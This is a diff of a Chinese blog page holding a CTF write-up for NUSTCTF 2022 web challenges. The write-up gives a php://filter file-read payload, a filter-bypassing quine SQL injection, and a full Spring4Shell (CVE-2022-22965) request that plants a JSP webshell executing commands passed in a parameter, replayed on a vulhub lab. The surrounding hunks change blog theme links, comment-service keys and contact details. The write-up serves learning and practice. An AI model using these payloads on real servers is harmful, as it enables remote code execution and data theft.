@@ -17,10 +17,20 @@ function  readmyfile($path){
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>NUSTCTF | hybcx&#39;s blog</title>
@@ -266,7 +276,7 @@ function  readmyfile($path){
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -323,7 +333,7 @@ function  readmyfile($path){
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -422,11 +432,6 @@ function  readmyfile($path){
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -442,7 +447,7 @@ function  readmyfile($path){
             <div id="articleContent">
                 <h1>[NUSTCTF 2022 新生赛]ezProtocol</h1>
 <p>web基础+md5强碰撞</p>
-<p><strong><img src="/2024/03/27/nustctf/image-20240327220705546.png" alt="image-20240327220705546"></strong></p>
+<p><strong><img src="image-20240327220705546.png" alt="image-20240327220705546"></strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">function</span>  <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -548,24 +553,24 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
 <span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里尝试伪协议，但发现过滤了很多，直接上字典去fuzz，如下图也是成功fuzz到，payload如下</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?file=<span class="token property">php</span><span class="token punctuation">:</span><span class="token comment">//filter/UCS-4%2a/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/27/nustctf/image-20240327151751127.png" alt="image-20240327151751127"></p>
+<p><img src="image-20240327151751127.png" alt="image-20240327151751127"></p>
 <p>这里看flag.php，发现是进行password查询的验证，这很容易想到之前的quine注入（刚做过。。）</p>
 <p>那直接开始测试吧，如下图，发现用户名只能是admin</p>
-<p><img src="/2024/03/27/nustctf/image-20240327152019430.png" alt="image-20240327152019430"></p>
+<p><img src="image-20240327152019430.png" alt="image-20240327152019430"></p>
 <p>这里在输入原payload的时候，发现过滤了char、空格、–+等关键字，虽然char可以用chr替换，但试了试发现没有回显，看了wp发现可以用16进制绕过。</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">1<span class="token string">'union/**/select/**/replace(REPLACE('</span>1<span class="token string">"union/**/select/**/replace(REPLACE("</span>.<span class="token string">",0x22,0x27),0x2e,"</span>.<span class="token string">")#',0x22,0x27),0x2e,'1"</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token function">REPLACE</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span>0x22<span class="token punctuation">,</span>0x27<span class="token punctuation">)</span><span class="token punctuation">,</span>0x2e<span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span>#'<span class="token punctuation">)</span>#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/27/nustctf/image-20240327154238477.png" alt="image-20240327154238477"></p>
+<p><img src="image-20240327154238477.png" alt="image-20240327154238477"></p>
 <h1>[NUSTCTF 2022 新生赛]Ezjava2</h1>
 <p>这里与Ezjava1环境相同，只不过要获取的是flag{2}，这里审了代码没啥思路，源码里面也找不到关于njust.jsp相关的信息，只能看wp，发现没有注意到war包的名字，这很暗示着我们这里有一个spring漏洞</p>
-<p><img src="/2024/03/27/nustctf/image-20240327160701840.png" alt="image-20240327160701840"></p>
+<p><img src="image-20240327160701840.png" alt="image-20240327160701840"></p>
 <p>接着google关键词搜索spring4shell，找到了一系列RCE文章以及poc脚本，具体原理分析可参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1877/">Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a></p>
 <p>总的来说，漏洞思路就是：</p>
 <p>通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat在<code>webapps/ROOT</code>目录输出定制的“访问日志”<code>tomcatwar.jsp</code>，该“访问日志”实际上为一个JSP webshell。</p>
 <p>这里我也看不太懂分析原理，直接就脚本小子了：<a target="_blank" rel="noopener" href="https://github.com/reznok/Spring4Shell-POC">https://github.com/reznok/Spring4Shell-POC</a></p>
-<p><img src="/2024/03/27/nustctf/image-20240327161923733.png" alt="image-20240327161923733"></p>
+<p><img src="image-20240327161923733.png" alt="image-20240327161923733"></p>
 <p>这里是我环境问题，复现也不成功了，这里使用vulhub来复现吧</p>
-<p><img src="/2024/03/27/nustctf/image-20240327190940996.png" alt="image-20240327190940996"></p>
+<p><img src="image-20240327190940996.png" alt="image-20240327190940996"></p>
 <p>搭建成功如上图所示，这里可以选择手打，也可以poc脚本，这里我先展示手打</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=<span class="token placeholder selector">%25</span><span class="token placeholder selector">%7Bc2</span><span class="token placeholder selector">%7Di</span><span class="token placeholder selector">%20if</span><span class="token punctuation">(</span><span class="token placeholder selector">%22j</span><span class="token placeholder selector">%22</span>.<span class="token function">equals</span><span class="token punctuation">(</span>request.<span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token placeholder selector">%22pwd</span><span class="token placeholder selector">%22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token placeholder selector">%7B</span><span class="token placeholder selector">%20java</span>.io.InputStream<span class="token placeholder selector">%20in</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%3D</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%25</span><span class="token placeholder selector">%7Bc1</span><span class="token placeholder selector">%7Di</span>.<span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.<span class="token function">exec</span><span class="token punctuation">(</span>request.<span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token placeholder selector">%22cmd</span><span class="token placeholder selector">%22</span><span class="token punctuation">)</span><span class="token punctuation">)</span>.<span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token placeholder selector">%3B</span><span class="token placeholder selector">%20int</span><span class="token placeholder selector">%20a</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%3D</span><span class="token placeholder selector">%20-1</span><span class="token placeholder selector">%3B</span><span class="token placeholder selector">%20byte</span><span class="token placeholder selector">%5B</span><span class="token placeholder selector">%5D</span><span class="token placeholder selector">%20b</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%3D</span><span class="token placeholder selector">%20new</span><span class="token placeholder selector">%20byte</span><span class="token placeholder selector">%5B2048</span><span class="token placeholder selector">%5D</span><span class="token placeholder selector">%3B</span><span class="token placeholder selector">%20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token placeholder selector">%3Din</span>.<span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>!<span class="token placeholder selector">%3D-1</span><span class="token punctuation">)</span><span class="token placeholder selector">%7B</span><span class="token placeholder selector">%20out</span>.<span class="token function">println</span><span class="token punctuation">(</span>new<span class="token placeholder selector">%20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token placeholder selector">%3B</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%7D</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%7D</span><span class="token placeholder selector">%20</span><span class="token placeholder selector">%25</span><span class="token placeholder selector">%7Bsuffix</span><span class="token placeholder selector">%7Di</span>&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
 <span class="token property">Host</span><span class="token punctuation">:</span> <span class="token property">localhost</span><span class="token punctuation">:</span>8080
@@ -578,11 +583,11 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
 <span class="token property">c1</span><span class="token punctuation">:</span> Runtime
 <span class="token property">c2</span><span class="token punctuation">:</span> &lt;%
 <span class="token property">DNT</span><span class="token punctuation">:</span> 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2024/03/27/nustctf/image-20240327191352207.png" alt="image-20240327191352207"></p>
-<p><img src="/2024/03/27/nustctf/image-20240327191427443.png" alt="image-20240327191427443"></p>
+<p><img src="image-20240327191352207.png" alt="image-20240327191352207"></p>
+<p><img src="image-20240327191427443.png" alt="image-20240327191427443"></p>
 <p>之后访问对应jsp webshell，即可RCE，这里用poc脚本的时候，发现搭的靶场出问题了，复现不出来，只好重新拉一个</p>
-<p><img src="/2024/03/27/nustctf/image-20240327194923371.png" alt="image-20240327194923371"></p>
-<p><img src="/2024/03/27/nustctf/image-20240327194919085.png" alt="image-20240327194919085"></p>
+<p><img src="image-20240327194923371.png" alt="image-20240327194923371"></p>
+<p><img src="image-20240327194919085.png" alt="image-20240327194919085"></p>
 
                 
             </div>
@@ -677,7 +682,7 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -685,7 +690,7 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -965,12 +970,12 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1115,6 +1120,8 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1142,8 +1149,8 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1226,8 +1233,6 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1247,24 +1252,28 @@ Spring MVC使用Java反射机制来获取和设置对象的属性值，而不依
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1476,8 +1485,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
